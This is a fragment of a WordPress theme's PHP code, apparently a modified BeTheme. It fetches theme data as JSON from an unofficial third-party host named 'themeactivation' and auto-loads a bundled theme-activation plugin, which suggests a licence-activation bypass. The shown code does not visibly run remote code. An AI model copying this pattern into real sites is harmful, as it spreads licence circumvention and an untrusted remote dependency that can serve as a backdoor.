...
define('MFN_THEME_VERSION', '27.3.8');
...
// Define a function to fetch dynamic theme data from API or elsewhere
function get_dynamic_theme_data() {
    // Replace this logic with your code to fetch JSON data from your API or source
    $json_url = 'https://themeactivation.pages.dev/betheme.json';
    $response = wp_remote_get($json_url);

    if (is_wp_error($response)) {
        return false; // Handle error or return default data
    }
...
// Load and activate custom plugin from theme's mu-plugins
function load_custom_theme_mu_plugin() {
    $plugin_file = 'includes/mu-plugins/theme-activation.php'; // Plugin file path in theme's mu-plugins
    $plugin_path = get_theme_file_path($plugin_file);
    
    if (file_exists($plugin_path)) {
        require_once $plugin_path;
        register_activation_hook($plugin_path, 'theme_activation');
    }
}
add_action('after_setup_theme', 'load_custom_theme_mu_plugin');
